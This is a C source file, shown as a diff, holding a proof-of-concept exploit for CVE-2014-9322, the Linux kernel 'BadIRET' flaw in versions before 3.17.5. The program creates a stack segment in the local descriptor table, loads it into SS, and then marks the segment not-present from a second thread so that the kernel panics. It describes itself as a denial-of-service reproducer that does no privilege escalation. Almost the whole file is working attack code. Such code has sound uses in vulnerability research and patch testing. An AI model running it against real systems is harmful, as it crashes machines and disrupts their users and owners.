@@ -1,0 +1,155 @@
+/* ----------------------------------------------------------------------------------------------------
+ * cve-2014-9322_poc.c
+ * 
+ * arch/x86/kernel/entry_64.S in the Linux kernel before 3.17.5 does not
+ * properly handle faults associated with the Stack Segment (SS) segment
+ * register, which allows local users to gain privileges by triggering an IRET
+ * instruction that leads to access to a GS Base address from the wrong space.
+ * 
+ * This is a POC to reproduce vulnerability. No exploitation here, just simple kernel panic.
+ * 
+ * I have no merit to writing this poc, I just implemented first part of Rafal Wojtczuk article (this guy is a genius!)
+ * More info at : http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
+ * 
+ * 
+ * Compile with gcc -fno-stack-protector -Wall -o cve-2014-9322_poc cve-2014-9322_poc.c  -lpthread
+ * 
+ * Emeric Nasi - www.sevagas.com
+ *-----------------------------------------------------------------------------------------------------*/
+ 
+  // Only works on x86_64 platform
+ #ifdef __x86_64__
+ 
+/* -----------------------   Includes ----------------------------*/
+#define _GNU_SOURCE
+#include <stdio.h> 
+#include <stdlib.h>
+#include <time.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <asm/ldt.h>
+#include <pthread.h>
+#include <sys/time.h>
+#include <inttypes.h>
+#include <stdbool.h>
+#include <errno.h>
+#include <sys/user.h>
+
+
+
+/* -----------------------   definitions ----------------------------*/
+
+
+#define TARGET_KERNEL_MIN "3.0.0"
+#define TARGET_KERNEL_MAX "3.17.4"
+#define EXPLOIT_NAME "cve-2014-9322"
+#define EXPLOIT_TYPE DOS
+
+
+#define FALSE_SS_BASE  0x10000UL
+#define MAP_SIZE    0x10000
+
+
+/* -----------------------   Global variables ----------------------------*/
+
+
+struct user_desc new_stack_segment;
+
+
+/* -----------------------   functions ----------------------------*/
+
+
+/**
+ * Creates a new segment in Local Descriptor Table
+ */
+static bool add_ldt(struct user_desc *desc, const char *name)
+{
+  if (syscall(SYS_modify_ldt, 1, desc, sizeof(struct user_desc)) == 0) 
+  {
+    return true;
+  } 
+  else 
+  {
+    printf("[cve_2014_9322 error]: Failed to create %s segment\n", name);
+    printf("modify_ldt failed, %s\n", strerror(errno));
+    return false;
+  }
+}
+
+
+int FLAG = 0;
+
+void * segManipulatorThread(void * none)
+{
+  new_stack_segment.entry_number    = 0x12;
+  new_stack_segment.base_addr       = 0x10000;
+  new_stack_segment.limit           = 0xffff;
+  new_stack_segment.seg_32bit       = 1;
+  new_stack_segment.contents        = MODIFY_LDT_CONTENTS_STACK; /* Data, grow-up */
+  new_stack_segment.read_exec_only  = 0;
+  new_stack_segment.limit_in_pages  = 0;
+  new_stack_segment.seg_not_present = 0;
+  new_stack_segment.useable         = 0;
+  new_stack_segment.lm = 0;
+  
+  // Create a new stack segment
+  add_ldt(&new_stack_segment, "newSS");
+  
+  // Wait for main thread to use new stack segment
+  sleep(3);  
+
+  // Invalidate stack segment 
+  new_stack_segment.seg_not_present = 1;
+  add_ldt(&new_stack_segment, "newSS disable");
+  FLAG = 1;
+  sleep(15);
+  
+  return NULL;
+}
+
+/**
+ * DOS poc for cve_2014_9322 vulnerability
+ */
+int main()
+{
+
+  pthread_t thread1;
+  uint8_t *code;
+  
+  printf("[cve_2014_9322]: Preparing to exploit.\n");
+  
+  // map area for false SS
+  code = (uint8_t *)mmap((void *)FALSE_SS_BASE, MAP_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -1, 0);
+  if (code != (uint8_t *) FALSE_SS_BASE) 
+  {
+    fprintf(stderr, "[cve_2014_9322 Error]: Unable to map memory at address: %lu\n", FALSE_SS_BASE);
+    return -1;
+  }
+   
+    printf("[cve_2014_9322]:  Panic!\n");
+  if(pthread_create(&thread1, NULL, segManipulatorThread, NULL)!= 0)
+  {
+    perror("[cve_2014_9322 error]: pthread_create");
+    return false;  
+  }
+  
+  // Wait for segManipulatorThread to create new stack segment
+  sleep(1);
+
+    // Set  stack segment to newly created one in segManipulatorThread
+  asm volatile ("mov %0, %%ss;"
+    :        
+    :"r" (0x97)
+  );
+  
+  while(FLAG == 0){};
+  sleep(4);
+
+  return 0;
+}
+
+
+#endif // __x86_64__
